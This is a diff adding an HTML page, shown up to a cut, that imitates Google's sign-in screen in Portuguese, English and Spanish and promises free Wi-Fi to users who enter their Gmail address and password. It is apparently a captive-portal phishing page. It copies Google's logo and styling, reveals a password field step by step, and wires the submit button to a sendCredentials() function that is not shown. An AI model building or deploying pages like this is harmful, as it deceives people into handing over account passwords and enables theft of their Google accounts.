@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login do Google</title>
+    <style>
+      /* Estilos CSS */
+      .hidden {
+        display: none;
+      }
+
+      body {
+        font-family: "Roboto", sans-serif;
+        background-color: #f1f3f4;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        padding: 0 10px; /* Adicionado para evitar corte de conteúdo em telas muito pequenas */
+        box-sizing: border-box;
+      }
+
+      .login-container {
+        width: 100%;
+        max-width: 360px;
+        padding: 40px;
+        background: white;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        border-radius: 8px;
+        text-align: center;
+        margin: 0 auto;
+        box-sizing: border-box; /* Certifique-se de incluir o padding no tamanho total */
+      }
+
+      .login-container img {
+        width: 75px;
+        margin-bottom: 16px;
+      }
+
+      .login-container h1 {
+        font-size: 24px;
+        color: #202124;
+        margin: 16px 0;
+        font-weight: 500;
+      }
+
+      .login-container p {
+        font-size: 16px;
+        color: #5f6368;
+        margin: 16px 0;
+        line-height: 1.5;
+      }
+
+      .login-container form {
+        position: relative;
+      }
+
+      .login-container .input-wrapper {
+        position: relative;
+        margin: 16px 0;
+      }
+
+      .login-container input[type="email"],
+      .login-container input[type="password"] {
+        width: 100%;
+        padding: 12px 16px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        outline: none;
+        transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        font-family: "Roboto", sans-serif;
+        box-sizing: border-box;
+      }
+
+      .login-container input[type="email"]:focus,
+      .login-container input[type="password"]:focus {
+        border-color: #1a73e8;
+        box-shadow: 0 0 0 1px #1a73e8;
+      }
+
+      .login-container label {
+        position: absolute;
+        top: 50%;
+        left: 16px;
+        transform: translateY(-50%);
+        color: #80868b;
+        pointer-events: none;
+        transition: top 0.2s, font-size 0.2s, color 0.2s;
+      }
+
+      .login-container input:focus + label,
+      .login-container input:not(:placeholder-shown) + label {
+        top: -10px;
+        left: 12px;
+        font-size: 12px;
+        color: #1a73e8;
+        background: white;
+        padding: 0 4px;
+      }
+
+      .login-container input[type="submit"] {
+        width: calc(50% - 8px);
+        padding: 12px 16px;
+        margin: 24px 4px 16px 0;
+        border: none;
+        border-radius: 4px;
+        background-color: #1a73e8;
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        font-family: "Roboto", sans-serif;
+      }
+
+      .login-container input[type="submit"]:hover {
+        background-color: #1558b6;
+      }
+
+      .login-container .footer {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 14px;
+        color: #5f6368;
+        margin-top: 16px;
+        flex-wrap: wrap; /* Adicionado para melhor resposta em telas pequenas */
+      }
+
+      .login-container .footer a {
+        color: #1a73e8;
+        text-decoration: none;
+        transition: text-decoration 0.2s;
+      }
+
+      .login-container .footer a:hover {
+        text-decoration: underline;
+      }
+
+      .login-container .language-selector {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 14px;
+        color: #5f6368;
+        margin-top: 16px;
+      }
+
+      .login-container .language-selector select {
+        border: none;
+        background: none;
+        font-size: 14px;
+        color: #1a73e8;
+        cursor: pointer;
+        font-family: "Roboto", sans-serif;
+      }
+
+      /* Adicionando media queries para melhorar a responsividade */
+      @media (max-width: 768px) {
+        .login-container {
+          padding: 30px;
+        }
+
+        .login-container h1 {
+          font-size: 20px;
+        }
+
+        .login-container p {
+          font-size: 14px;
+        }
+
+        .login-container input[type="submit"] {
+          width: 100%;
+          margin: 16px 0;
+        }
+
+        .login-container .footer {
+          flex-direction: column;
+          text-align: center;
+        }
+      }
+
+      @media (max-width: 400px) {
+        .login-container {
+          padding: 20px;
+        }
+
+        .login-container h1 {
+          font-size: 18px;
+        }
+
+        .login-container p {
+          font-size: 12px;
+        }
+      }
+
+      /* Placeholder styling */
+      .login-container input::placeholder {
+        color: transparent;
+        transition: color 0.3s ease;
+      }
+
+      .login-container input:focus::placeholder {
+        color: transparent;
+      }
+
+      .login-container input:focus + label,
+      .login-container input:not(:placeholder-shown) + label {
+        top: -10px;
+        left: 12px;
+        font-size: 12px;
+        color: #1a73e8;
+        background: white;
+        padding: 0 4px;
+        transition: all 0.2s ease;
+      }
+
+      .logo-google {
+        padding: 1px;
+        margin-top: 0px;
+        margin-bottom: 0px;
+      }
+
+      .logo-google svg {
+        padding: 0px;
+        margin-top: 0px;
+        margin-bottom: 0px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <!-- Corpo em Português -->
+      <div id="pt-BR">
+        <div class="logo-google">
+          <!-- <div>
+            <svg
+              id="Capa_1"
+              style="enable-background: new 0 0 54 54"
+              version="1.1"
+              viewBox="0 0 150 150"
+              xml:space="preserve"
+              xmlns="http://www.w3.org/2000/svg"
+              xmlns:xlink="http://www.w3.org/1999/xlink"
+              width="76"
+              height="80"
+            >
+              <style type="text/css">
+                .st0 {
+                  fill: #1a73e8;
+                }
+                .st1 {
+                  fill: #ea4335;
+                }
+                .st2 {
+                  fill: #4285f4;
+                }
+                .st3 {
+                  fill: #fbbc04;
+                }
+                .st4 {
+                  fill: #34a853;
+                }
+                .st5 {
+                  fill: #4caf50;
+                }
+                .st6 {
+                  fill: #1e88e5;
+                }
+                .st7 {
+                  fill: #e53935;
+                }
+                .st8 {
+                  fill: #c62828;
+                }
+                .st9 {
+                  fill: #fbc02d;
+                }
+                .st10 {
+                  fill: #1565c0;
+                }
+                .st11 {
+                  fill: #2e7d32;
+                }
+                .st12 {
+                  fill: #f6b704;
+                }
+                .st13 {
+                  fill: #e54335;
+                }
+                .st14 {
+                  fill: #4280ef;
+                }
+                .st15 {
+                  fill: #34a353;
+                }
+                .st16 {
+                  clip-path: url(#SVGID_2_);
+                }
+                .st17 {
+                  fill: #188038;
+                }
+                .st18 {
+                  opacity: 0.2;
+                  fill: #ffffff;
+                  enable-background: new;
+                }
+                .st19 {
+                  opacity: 0.3;
+                  fill: #0d652d;
+                  enable-background: new;
+                }
+                .st20 {
+                  clip-path: url(#SVGID_4_);
+                }
+                .st21 {
+                  opacity: 0.3;
+                  fill: url(#_45_shadow_1_);
+                  enable-background: new;
+                }
+                .st22 {
+                  clip-path: url(#SVGID_6_);
+                }
+                .st23 {
+                  fill: #fa7b17;
+                }
+                .st24 {
+                  opacity: 0.3;
+                  fill: #174ea6;
+                  enable-background: new;
+                }
+                .st25 {
+                  opacity: 0.3;
+                  fill: #a50e0e;
+                  enable-background: new;
+                }
+                .st26 {
+                  opacity: 0.3;
+                  fill: #e37400;
+                  enable-background: new;
+                }
+                .st27 {
+                  fill: url(#Finish_mask_1_);
+                }
+                .st28 {
+                  fill: #ffffff;
+                }
+                .st29 {
+                  fill: #0c9d58;
+                }
+                .st30 {
+                  opacity: 0.2;
+                  fill: #004d40;
+                  enable-background: new;
+                }
+                .st31 {
+                  opacity: 0.2;
+                  fill: #3e2723;
+                  enable-background: new;
+                }
+                .st32 {
+                  fill: #ffc107;
+                }
+                .st33 {
+                  opacity: 0.2;
+                  fill: #1a237e;
+                  enable-background: new;
+                }
+                .st34 {
+                  opacity: 0.2;
+                }
+                .st35 {
+                  fill: #1a237e;
+                }
+                .st36 {
+                  fill: url(#SVGID_7_);
+                }
+                .st37 {
+                  fill: #fbbc05;
+                }
+                .st38 {
+                  clip-path: url(#SVGID_9_);
+                  fill: #e53935;
+                }
+                .st39 {
+                  clip-path: url(#SVGID_11_);
+                  fill: #fbc02d;
+                }
+                .st40 {
+                  clip-path: url(#SVGID_13_);
+                  fill: #e53935;
+                }
+                .st41 {
+                  clip-path: url(#SVGID_15_);
+                  fill: #fbc02d;
+                }
+              </style>
+              <g>
+                <path
+                  class="st6"
+                  d="M54.8,94.5c-3.4-3.5-6.3-7.4-9.4-11.1c-5.8-6.9-11.6-13.8-17.4-20.7c-3-3.5-2.9-5.1,0.3-8.6   c9.3-10.4,20.9-16.7,34.6-19.4c4-0.8,8.1-1.3,12.3-1c0,4.9,0,9.8,0,14.6c0,2.9,0,2.9,2.8,3.2c-10.1-0.4-19.5,1.7-28,7.2   c-1.3,0.8-0.7,1.3-0.1,2c3,3.6,6.1,7.1,9.1,10.8c2.5,3.1,5.3,5.9,7.5,9.2c-0.1,0-0.4,0-0.4,0.1c-3.3,4.3-6.9,8.4-10.5,12.5   C55,93.7,54.8,94.1,54.8,94.5z"
+                />
+                <path
+                  class="st7"
+                  d="M77.8,51.5C75,51.2,75,51.2,75,48.3c0-4.9,0-9.8,0-14.6c4.8-0.3,9.5,0.3,14.1,1.4c13.2,3,24.4,9.4,33.3,19.7   c2.4,2.8,2.4,4.7,0.1,7.4c-2.6,3.1-5.2,6.1-7.8,9.1c-1.1-1.6-2.6-2.9-4-4.3c-2.8-2.8-5.8-5.4-9.3-7.4c-0.7-0.5-1.3-1-2-1.5   C92.7,54.1,85.5,52,77.8,51.5z"
+                />
+                <path
+                  class="st5"
+                  d="M101.3,59.7c3.5,2,6.5,4.6,9.3,7.4c1.4,1.4,2.9,2.7,4,4.3c-4.1,4.9-8.2,9.9-12.3,14.8   c-5.2,6.2-10.4,12.4-15.6,18.5c-1.6-1.2-2.7-2.9-3.9-4.5c-2.6-3.1-5.2-6.3-7.8-9.4c2.5-3,5-6,7.6-8.9   C88.9,74.5,95.1,67.1,101.3,59.7z"
+                />
+                <path
+                  class="st9"
+                  d="M75.1,90.8c2.6,3.1,5.2,6.3,7.8,9.4c1.3,1.5,2.3,3.2,3.9,4.5c-2.7,3.2-5.4,6.5-8.1,9.7   c-2.2,2.5-5.1,2.7-7.2,0.1c-5.6-6.6-11.1-13.2-16.6-19.8c-0.1-0.1-0.1-0.2-0.1-0.3c0.1-0.4,0.2-0.8,0.5-1.1   c3.6-4.1,7.2-8.2,10.5-12.5c0.1-0.1,0.3-0.1,0.4-0.1c1.1,0.7,1.7,1.9,2.6,2.8C70.9,85.9,72.8,88.6,75.1,90.8z"
+                />
+              </g>
+            </svg>
+          </div> -->
+          <div>
+            <svg
+              width="105"
+              height="54"
+              viewBox="0 0 75 24"
+              xmlns="http://www.w3.org/2000/svg"
+              aria-hidden="true"
+              class="BFr46e xduoyf"
+            >
+              <g id="qaEJec">
+                <path
+                  fill="#ea4335"
+                  d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"
+                ></path>
+              </g>
+              <g id="YGlOvc">
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+              </g>
+              <g id="BWfIk">
+                <path
+                  fill="#4285f4"
+                  d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"
+                ></path>
+              </g>
+              <g id="e6m3fd">
+                <path
+                  fill="#fbbc05"
+                  d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"
+                ></path>
+              </g>
+              <g id="vbkDmc">
+                <path
+                  fill="#ea4335"
+                  d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"
+                ></path>
+              </g>
+              <g id="idEJde">
+                <path
+                  fill="#4285f4"
+                  d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"
+                ></path>
+              </g>
+            </svg>
+          </div>
+        </div>
+
+        <div>
+          <!-- SVG do logo do Google (substituído pela imagem acima) -->
+        </div>
+        <!-- Corpo em Português -->
+        <h1>Entrar com Google</h1>
+        <p>Utiliza sua conta do Gmail para utilizar o Wifi gratuitamente</p>
+        <form action="#" method="post">
+          <div class="input-wrapper">
+            <input
+              type="email"
+              name="email"
+              id="email"
+              required
+              placeholder="Email ou telefone"
+            />
+            <label for="email"></label>
+          </div>
+          <div
+            class="input-wrapper"
+            id="password-wrapper"
+            style="display: none"
+          >
+            <input
+              type="password"
+              name="password"
+              id="password"
+              required
+              placeholder="Digite sua senha"
+            />
+            <label for="password"></label>
+          </div>
+          <input onclick="sendCredentials()" type="submit" value="Próxima" />
+        </form>
+
+        <div class="language-selector">
+          <p for="language">Idioma:</p>
+          <select id="language" onchange="changeLanguage(this.value)">
+            <option value="pt-BR" selected>Português (Brasil)</option>
+            <option value="en">English</option>
+            <option value="es">Español</option>
+            <!-- Adicione mais idiomas conforme necessário -->
+          </select>
+        </div>
+      </div>
+
+      <!-- Corpo em Inglês -->
+      <div id="en" class="hidden">
+        <div class="logo-google">
+          <div>
+            <!-- <svg
+              id="Capa_1"
+              style="enable-background: new 0 0 54 54"
+              version="1.1"
+              viewBox="0 0 150 150"
+              xml:space="preserve"
+              xmlns="http://www.w3.org/2000/svg"
+              xmlns:xlink="http://www.w3.org/1999/xlink"
+              width="76"
+              height="80"
+            >
+              <style type="text/css">
+                .st0 {
+                  fill: #1a73e8;
+                }
+                .st1 {
+                  fill: #ea4335;
+                }
+                .st2 {
+                  fill: #4285f4;
+                }
+                .st3 {
+                  fill: #fbbc04;
+                }
+                .st4 {
+                  fill: #34a853;
+                }
+                .st5 {
+                  fill: #4caf50;
+                }
+                .st6 {
+                  fill: #1e88e5;
+                }
+                .st7 {
+                  fill: #e53935;
+                }
+                .st8 {
+                  fill: #c62828;
+                }
+                .st9 {
+                  fill: #fbc02d;
+                }
+                .st10 {
+                  fill: #1565c0;
+                }
+                .st11 {
+                  fill: #2e7d32;
+                }
+                .st12 {
+                  fill: #f6b704;
+                }
+                .st13 {
+                  fill: #e54335;
+                }
+                .st14 {
+                  fill: #4280ef;
+                }
+                .st15 {
+                  fill: #34a353;
+                }
+                .st16 {
+                  clip-path: url(#SVGID_2_);
+                }
+                .st17 {
+                  fill: #188038;
+                }
+                .st18 {
+                  opacity: 0.2;
+                  fill: #ffffff;
+                  enable-background: new;
+                }
+                .st19 {
+                  opacity: 0.3;
+                  fill: #0d652d;
+                  enable-background: new;
+                }
+                .st20 {
+                  clip-path: url(#SVGID_4_);
+                }
+                .st21 {
+                  opacity: 0.3;
+                  fill: url(#_45_shadow_1_);
+                  enable-background: new;
+                }
+                .st22 {
+                  clip-path: url(#SVGID_6_);
+                }
+                .st23 {
+                  fill: #fa7b17;
+                }
+                .st24 {
+                  opacity: 0.3;
+                  fill: #174ea6;
+                  enable-background: new;
+                }
+                .st25 {
+                  opacity: 0.3;
+                  fill: #a50e0e;
+                  enable-background: new;
+                }
+                .st26 {
+                  opacity: 0.3;
+                  fill: #e37400;
+                  enable-background: new;
+                }
+                .st27 {
+                  fill: url(#Finish_mask_1_);
+                }
+                .st28 {
+                  fill: #ffffff;
+                }
+                .st29 {
+                  fill: #0c9d58;
+                }
+                .st30 {
+                  opacity: 0.2;
+                  fill: #004d40;
+                  enable-background: new;
+                }
+                .st31 {
+                  opacity: 0.2;
+                  fill: #3e2723;
+                  enable-background: new;
+                }
+                .st32 {
+                  fill: #ffc107;
+                }
+                .st33 {
+                  opacity: 0.2;
+                  fill: #1a237e;
+                  enable-background: new;
+                }
+                .st34 {
+                  opacity: 0.2;
+                }
+                .st35 {
+                  fill: #1a237e;
+                }
+                .st36 {
+                  fill: url(#SVGID_7_);
+                }
+                .st37 {
+                  fill: #fbbc05;
+                }
+                .st38 {
+                  clip-path: url(#SVGID_9_);
+                  fill: #e53935;
+                }
+                .st39 {
+                  clip-path: url(#SVGID_11_);
+                  fill: #fbc02d;
+                }
+                .st40 {
+                  clip-path: url(#SVGID_13_);
+                  fill: #e53935;
+                }
+                .st41 {
+                  clip-path: url(#SVGID_15_);
+                  fill: #fbc02d;
+                }
+              </style>
+              <g>
+                <path
+                  class="st6"
+                  d="M54.8,94.5c-3.4-3.5-6.3-7.4-9.4-11.1c-5.8-6.9-11.6-13.8-17.4-20.7c-3-3.5-2.9-5.1,0.3-8.6   c9.3-10.4,20.9-16.7,34.6-19.4c4-0.8,8.1-1.3,12.3-1c0,4.9,0,9.8,0,14.6c0,2.9,0,2.9,2.8,3.2c-10.1-0.4-19.5,1.7-28,7.2   c-1.3,0.8-0.7,1.3-0.1,2c3,3.6,6.1,7.1,9.1,10.8c2.5,3.1,5.3,5.9,7.5,9.2c-0.1,0-0.4,0-0.4,0.1c-3.3,4.3-6.9,8.4-10.5,12.5   C55,93.7,54.8,94.1,54.8,94.5z"
+                />
+                <path
+                  class="st7"
+                  d="M77.8,51.5C75,51.2,75,51.2,75,48.3c0-4.9,0-9.8,0-14.6c4.8-0.3,9.5,0.3,14.1,1.4c13.2,3,24.4,9.4,33.3,19.7   c2.4,2.8,2.4,4.7,0.1,7.4c-2.6,3.1-5.2,6.1-7.8,9.1c-1.1-1.6-2.6-2.9-4-4.3c-2.8-2.8-5.8-5.4-9.3-7.4c-0.7-0.5-1.3-1-2-1.5   C92.7,54.1,85.5,52,77.8,51.5z"
+                />
+                <path
+                  class="st5"
+                  d="M101.3,59.7c3.5,2,6.5,4.6,9.3,7.4c1.4,1.4,2.9,2.7,4,4.3c-4.1,4.9-8.2,9.9-12.3,14.8   c-5.2,6.2-10.4,12.4-15.6,18.5c-1.6-1.2-2.7-2.9-3.9-4.5c-2.6-3.1-5.2-6.3-7.8-9.4c2.5-3,5-6,7.6-8.9   C88.9,74.5,95.1,67.1,101.3,59.7z"
+                />
+                <path
+                  class="st9"
+                  d="M75.1,90.8c2.6,3.1,5.2,6.3,7.8,9.4c1.3,1.5,2.3,3.2,3.9,4.5c-2.7,3.2-5.4,6.5-8.1,9.7   c-2.2,2.5-5.1,2.7-7.2,0.1c-5.6-6.6-11.1-13.2-16.6-19.8c-0.1-0.1-0.1-0.2-0.1-0.3c0.1-0.4,0.2-0.8,0.5-1.1   c3.6-4.1,7.2-8.2,10.5-12.5c0.1-0.1,0.3-0.1,0.4-0.1c1.1,0.7,1.7,1.9,2.6,2.8C70.9,85.9,72.8,88.6,75.1,90.8z"
+                />
+              </g>
+            </svg> -->
+          </div>
+          <div>
+            <svg
+              width="105"
+              height="54"
+              viewBox="0 0 75 24"
+              xmlns="http://www.w3.org/2000/svg"
+              aria-hidden="true"
+              class="BFr46e xduoyf"
+            >
+              <g id="qaEJec">
+                <path
+                  fill="#ea4335"
+                  d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"
+                ></path>
+              </g>
+              <g id="YGlOvc">
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+              </g>
+              <g id="BWfIk">
+                <path
+                  fill="#4285f4"
+                  d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"
+                ></path>
+              </g>
+              <g id="e6m3fd">
+                <path
+                  fill="#fbbc05"
+                  d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"
+                ></path>
+              </g>
+              <g id="vbkDmc">
+                <path
+                  fill="#ea4335"
+                  d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"
+                ></path>
+              </g>
+              <g id="idEJde">
+                <path
+                  fill="#4285f4"
+                  d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"
+                ></path>
+              </g>
+            </svg>
+          </div>
+        </div>
+
+        <div>
+          <!-- SVG do logo do Google (substituído pela imagem acima) -->
+        </div>
+        <h1>sign in with google</h1>
+        <p>Use your Gmail account to use Wifi for free</p>
+        <form action="#" method="post">
+          <div class="input-wrapper">
+            <input
+              type="email"
+              name="email"
+              id="email"
+              required
+              placeholder="Email or phone"
+            />
+            <label for="email"></label>
+          </div>
+          <div
+            class="input-wrapper"
+            id="password-wrapper"
+            style="display: none"
+          >
+            <input
+              type="password"
+              name="password"
+              id="password"
+              required
+              placeholder="Enter your password"
+            />
+            <label for="password"></label>
+          </div>
+          <input type="submit" value="Next" />
+        </form>
+
+        <div class="language-selector">
+          <p for="language">Language:</p>
+          <select id="language" onchange="changeLanguage(this.value)">
+            <option value="pt-BR">Português (Brasil)</option>
+            <option value="en" selected>English</option>
+            <option value="es">Español</option>
+            <!-- Add more languages as needed -->
+          </select>
+        </div>
+      </div>
+      <!-- Corpo em Espanhol -->
+      <div id="es" class="hidden">
+        <div class="logo-google">
+          <div>
+            <!-- <svg
+              id="Capa_1"
+              style="enable-background: new 0 0 54 54"
+              version="1.1"
+              viewBox="0 0 150 150"
+              xml:space="preserve"
+              xmlns="http://www.w3.org/2000/svg"
+              xmlns:xlink="http://www.w3.org/1999/xlink"
+              width="76"
+              height="80"
+            >
+              <style type="text/css">
+                .st0 {
+                  fill: #1a73e8;
+                }
+                .st1 {
+                  fill: #ea4335;
+                }
+                .st2 {
+                  fill: #4285f4;
+                }
+                .st3 {
+                  fill: #fbbc04;
+                }
+                .st4 {
+                  fill: #34a853;
+                }
+                .st5 {
+                  fill: #4caf50;
+                }
+                .st6 {
+                  fill: #1e88e5;
+                }
+                .st7 {
+                  fill: #e53935;
+                }
+                .st8 {
+                  fill: #c62828;
+                }
+                .st9 {
+                  fill: #fbc02d;
+                }
+                .st10 {
+                  fill: #1565c0;
+                }
+                .st11 {
+                  fill: #2e7d32;
+                }
+                .st12 {
+                  fill: #f6b704;
+                }
+                .st13 {
+                  fill: #e54335;
+                }
+                .st14 {
+                  fill: #4280ef;
+                }
+                .st15 {
+                  fill: #34a353;
+                }
+                .st16 {
+                  clip-path: url(#SVGID_2_);
+                }
+                .st17 {
+                  fill: #188038;
+                }
+                .st18 {
+                  opacity: 0.2;
+                  fill: #ffffff;
+                  enable-background: new;
+                }
+                .st19 {
+                  opacity: 0.3;
+                  fill: #0d652d;
+                  enable-background: new;
+                }
+                .st20 {
+                  clip-path: url(#SVGID_4_);
+                }
+                .st21 {
+                  opacity: 0.3;
+                  fill: url(#_45_shadow_1_);
+                  enable-background: new;
+                }
+                .st22 {
+                  clip-path: url(#SVGID_6_);
+                }
+                .st23 {
+                  fill: #fa7b17;
+                }
+                .st24 {
+                  opacity: 0.3;
+                  fill: #174ea6;
+                  enable-background: new;
+                }
+                .st25 {
+                  opacity: 0.3;
+                  fill: #a50e0e;
+                  enable-background: new;
+                }
+                .st26 {
+                  opacity: 0.3;
+                  fill: #e37400;
+                  enable-background: new;
+                }
+                .st27 {
+                  fill: url(#Finish_mask_1_);
+                }
+                .st28 {
+                  fill: #ffffff;
+                }
+                .st29 {
+                  fill: #0c9d58;
+                }
+                .st30 {
+                  opacity: 0.2;
+                  fill: #004d40;
+                  enable-background: new;
+                }
+                .st31 {
+                  opacity: 0.2;
+                  fill: #3e2723;
+                  enable-background: new;
+                }
+                .st32 {
+                  fill: #ffc107;
+                }
+                .st33 {
+                  opacity: 0.2;
+                  fill: #1a237e;
+                  enable-background: new;
+                }
+                .st34 {
+                  opacity: 0.2;
+                }
+                .st35 {
+                  fill: #1a237e;
+                }
+                .st36 {
+                  fill: url(#SVGID_7_);
+                }
+                .st37 {
+                  fill: #fbbc05;
+                }
+                .st38 {
+                  clip-path: url(#SVGID_9_);
+                  fill: #e53935;
+                }
+                .st39 {
+                  clip-path: url(#SVGID_11_);
+                  fill: #fbc02d;
+                }
+                .st40 {
+                  clip-path: url(#SVGID_13_);
+                  fill: #e53935;
+                }
+                .st41 {
+                  clip-path: url(#SVGID_15_);
+                  fill: #fbc02d;
+                }
+              </style>
+              <g>
+                <path
+                  class="st6"
+                  d="M54.8,94.5c-3.4-3.5-6.3-7.4-9.4-11.1c-5.8-6.9-11.6-13.8-17.4-20.7c-3-3.5-2.9-5.1,0.3-8.6   c9.3-10.4,20.9-16.7,34.6-19.4c4-0.8,8.1-1.3,12.3-1c0,4.9,0,9.8,0,14.6c0,2.9,0,2.9,2.8,3.2c-10.1-0.4-19.5,1.7-28,7.2   c-1.3,0.8-0.7,1.3-0.1,2c3,3.6,6.1,7.1,9.1,10.8c2.5,3.1,5.3,5.9,7.5,9.2c-0.1,0-0.4,0-0.4,0.1c-3.3,4.3-6.9,8.4-10.5,12.5   C55,93.7,54.8,94.1,54.8,94.5z"
+                />
+                <path
+                  class="st7"
+                  d="M77.8,51.5C75,51.2,75,51.2,75,48.3c0-4.9,0-9.8,0-14.6c4.8-0.3,9.5,0.3,14.1,1.4c13.2,3,24.4,9.4,33.3,19.7   c2.4,2.8,2.4,4.7,0.1,7.4c-2.6,3.1-5.2,6.1-7.8,9.1c-1.1-1.6-2.6-2.9-4-4.3c-2.8-2.8-5.8-5.4-9.3-7.4c-0.7-0.5-1.3-1-2-1.5   C92.7,54.1,85.5,52,77.8,51.5z"
+                />
+                <path
+                  class="st5"
+                  d="M101.3,59.7c3.5,2,6.5,4.6,9.3,7.4c1.4,1.4,2.9,2.7,4,4.3c-4.1,4.9-8.2,9.9-12.3,14.8   c-5.2,6.2-10.4,12.4-15.6,18.5c-1.6-1.2-2.7-2.9-3.9-4.5c-2.6-3.1-5.2-6.3-7.8-9.4c2.5-3,5-6,7.6-8.9   C88.9,74.5,95.1,67.1,101.3,59.7z"
+                />
+                <path
+                  class="st9"
+                  d="M75.1,90.8c2.6,3.1,5.2,6.3,7.8,9.4c1.3,1.5,2.3,3.2,3.9,4.5c-2.7,3.2-5.4,6.5-8.1,9.7   c-2.2,2.5-5.1,2.7-7.2,0.1c-5.6-6.6-11.1-13.2-16.6-19.8c-0.1-0.1-0.1-0.2-0.1-0.3c0.1-0.4,0.2-0.8,0.5-1.1   c3.6-4.1,7.2-8.2,10.5-12.5c0.1-0.1,0.3-0.1,0.4-0.1c1.1,0.7,1.7,1.9,2.6,2.8C70.9,85.9,72.8,88.6,75.1,90.8z"
+                />
+              </g>
+            </svg> -->
+          </div>
+          <div>
+            <svg
+              width="105"
+              height="54"
+              viewBox="0 0 75 24"
+              xmlns="http://www.w3.org/2000/svg"
+              aria-hidden="true"
+              class="BFr46e xduoyf"
+            >
+              <g id="qaEJec">
+                <path
+                  fill="#ea4335"
